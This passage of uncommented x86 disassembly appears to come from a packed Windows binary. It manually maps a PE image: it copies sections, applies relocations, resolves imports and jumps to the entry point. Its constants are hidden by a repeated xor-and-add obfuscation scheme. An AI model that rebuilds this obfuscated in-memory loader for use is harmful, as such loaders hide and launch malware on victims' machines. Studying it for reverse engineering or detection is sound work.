  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
